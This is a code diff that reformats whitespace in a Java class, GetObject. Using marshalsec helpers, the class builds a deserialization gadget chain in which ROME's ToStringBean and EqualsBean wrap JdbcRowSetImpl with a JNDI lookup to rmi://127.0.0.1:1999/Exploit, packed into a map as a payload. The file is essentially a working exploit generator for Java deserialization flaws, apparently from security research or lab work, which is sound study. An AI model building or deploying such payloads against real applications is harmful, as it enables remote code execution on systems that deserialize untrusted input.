@@ -6,7 +6,7 @@ import com.sun.rowset.JdbcRowSetImpl;
 import marshalsec.gadgets.JDKUtil;
 
 public class GetObject {
-    public static   void main(String[] arg) throws Exception{
+    public static void main(String[] arg) throws Exception {
 
         Object obj = getObject();
 
@@ -14,10 +14,10 @@ public class GetObject {
 
     }
 
-    public static Object getObject() throws  Exception{
+    public static Object getObject() throws Exception {
         String url = "rmi://127.0.0.1:1999/Exploit";
         ToStringBean item = new ToStringBean(JdbcRowSetImpl.class, JDKUtil.makeJNDIRowSet(url));
-        EqualsBean root = new EqualsBean(ToStringBean.class,item);
-        return JDKUtil.makeMap(root,root);
+        EqualsBean root = new EqualsBean(ToStringBean.class, item);
+        return JDKUtil.makeMap(root, root);
     }
 }
